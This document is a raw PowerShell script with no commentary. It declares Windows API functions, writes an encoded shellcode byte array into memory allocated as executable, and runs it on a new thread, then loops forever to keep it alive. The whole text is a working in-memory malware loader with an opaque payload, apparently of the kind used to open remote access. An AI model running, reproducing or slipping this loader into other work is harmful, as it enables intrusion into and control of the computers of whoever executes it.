$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0xc9,0xf5,0x1a,0x59,0xdb,0xd3,0xd9,0x74,0x24,0xf4,0x5f,0x33,0xc9,0xb1,0x47,0x31,0x47,0x13,0x83,0xef,0xfc,0x03,0x47,0xc6,0x17,0xef,0xa5,0x30,0x55,0x10,0x56,0xc0,0x3a,0x98,0xb3,0xf1,0x7a,0xfe,0xb0,0xa1,0x4a,0x74,0x94,0x4d,0x20,0xd8,0x0d,0xc6,0x44,0xf5,0x22,0x6f,0xe2,0x23,0x0c,0x70,0x5f,0x17,0x0f,0xf2,0xa2,0x44,0xef,0xcb,0x6c,0x99,0xee,0x0c,0x90,0x50,0xa2,0xc5,0xde,0xc7,0x53,0x62,0xaa,0xdb,0xd8,0x38,0x3a,0x5c,0x3c,0x88,0x3d,0x4d,0x93,0x83,0x67,0x4d,0x15,0x40,0x1c,0xc4,0x0d,0x85,0x19,0x9e,0xa6,0x7d,0xd5,0x21,0x6f,0x4c,0x16,0x8d,0x4e,0x61,0xe5,0xcf,0x97,0x45,0x16,0xba,0xe1,0xb6,0xab,0xbd,0x35,0xc5,0x77,0x4b,0xae,0x6d,0xf3,0xeb,0x0a,0x8c,0xd0,0x6a,0xd8,0x82,0x9d,0xf9,0x86,0x86,0x20,0x2d,0xbd,0xb2,0xa9,0xd0,0x12,0x33,0xe9,0xf6,0xb6,0x18,0xa9,0x97,0xef,0xc4,0x1c,0xa7,0xf0,0xa7,0xc1,0x0d,0x7a,0x45,0x15,0x3c,0x21,0x01,0xda,0x0d,0xda,0xd1,0x74,0x05,0xa9,0xe3,0xdb,0xbd,0x25,0x4f,0x93,0x1b,0xb1,0xb0,0x8e,0xdc,0x2d,0x4f,0x31,0x1d,0x67,0x8b,0x65,0x4d,0x1f,0x3a,0x06,0x06,0xdf,0xc3,0xd3,0x89,0x8f,0x6b,0x8c,0x69,0x60,0xcb,0x7c,0x02,0x6a,0xc4,0xa3,0x32,0x95,0x0f,0xcc,0xd9,0x6f,0xc7,0x33,0xb5,0x71,0x1f,0xdc,0xc4,0x71,0x1e,0xa7,0x40,0x97,0x4a,0xc7,0x04,0x0f,0xe2,0x7e,0x0d,0xdb,0x93,0x7f,0x9b,0xa1,0x93,0xf4,0x28,0x55,0x5d,0xfd,0x45,0x45,0x09,0x0d,0x10,0x37,0x9f,0x12,0x8e,0x52,0x1f,0x87,0x35,0xf5,0x48,0x3f,0x34,0x20,0xbe,0xe0,0xc7,0x07,0xb5,0x29,0x52,0xe8,0xa1,0x55,0xb2,0xe8,0x31,0x00,0xd8,0xe8,0x59,0xf4,0xb8,0xba,0x7c,0xfb,0x14,0xaf,0x2d,0x6e,0x97,0x86,0x82,0x39,0xff,0x24,0xfd,0x0e,0xa0,0xd7,0x28,0x8f,0x9c,0x01,0x14,0xe5,0xcc,0x91;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};